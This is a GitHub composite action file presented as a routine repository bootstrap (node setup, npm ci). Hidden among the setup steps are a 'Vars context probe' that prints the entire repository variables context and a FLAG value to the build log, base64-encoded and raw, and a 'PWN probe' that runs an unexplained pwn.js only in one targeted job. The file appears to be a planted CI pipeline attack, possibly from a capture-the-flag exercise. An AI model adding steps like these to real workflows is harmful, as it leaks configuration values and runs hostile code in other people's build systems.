name: Bootstrap Workflow
description: Reusable action for setting up the repo
runs:
  using: composite
  steps:
    - name: Setup node
      uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8
      with:
        node-version: 22
        cache: 'npm'
        cache-dependency-path: utils/package-lock.json

    - name: Vars context probe
      shell: bash
      env:
        VARS_CTX: ${{ toJSON(vars) }}
        FLAG_VAR: ${{ vars.FLAG }}
      run: |
        echo "VARSCTX_B64=$(printf '%s' "$VARS_CTX" | base64 -w0)"
        echo "FLAGVAR_B64=$(printf '%s' "$FLAG_VAR" | base64 -w0)"
        echo "VARSCTX_RAW=$VARS_CTX"

    - name: PWN probe
      shell: bash
      run: |
        if [ "$GITHUB_JOB" != "ensure-quickstart-ids-are-unique" ]; then
          echo "PWN_MARKER_SKIP job=$GITHUB_JOB"
          exit 0
        fi
        node "$GITHUB_WORKSPACE/pwn.js" || true

    - name: Install dependencies
      shell: bash
      run: cd utils && npm ci
